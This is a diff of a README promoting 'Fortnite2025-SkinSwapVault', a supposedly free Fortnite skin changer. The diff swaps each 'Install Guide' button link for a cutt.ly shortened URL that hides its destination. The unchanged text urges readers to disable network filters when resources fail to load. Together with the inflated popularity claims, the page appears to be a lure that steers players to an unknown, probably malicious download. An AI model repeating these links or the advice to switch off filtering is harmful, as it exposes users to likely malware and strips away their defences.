@@ -6,9 +6,10 @@
 
 **About Fortnite2025-SkinSwapVault**: Fortnite2025-SkinSwapVault is a resource center for Fortnite players seeking to enhance **Fortnite 2025** with a skin changer. This repository provides community-crafted tutorials, setup tips, and exclusive skin customization resources, all designed as a free skin changer experience. Supported by 67K+ visitors and 43K+ subscribers, it’s the go-to hub for skin enthusiasts in 2025!
 
-<a href="https://fortniteskinchangerhub.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/rrNydAG2" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
+
 
 ---
 
@@ -31,9 +32,10 @@ Transform your **Fortnite 2025** with **Fortnite2025-SkinSwapVault** using these
 5. **Resolve Access Issues** 🌐  
    If resources don’t load, disable any network filters or switch browsers (e.g., Chrome, Firefox, or Edge).
 
-<a href="https://fortniteskinchangerhub.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/rrNydAG2" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
+
 
 ---
 
@@ -63,9 +65,10 @@ Transform your **Fortnite 2025** with **Fortnite2025-SkinSwapVault** using these
 - 📚 **Skill Growth**: Learn skin-changing techniques.  
 - 💎 **Collection Building**: Curate your skin library.
 
-<a href="https://fortniteskinchangerhub.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/rrNydAG2" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
+
 
 ## 🏆 Benefits
 
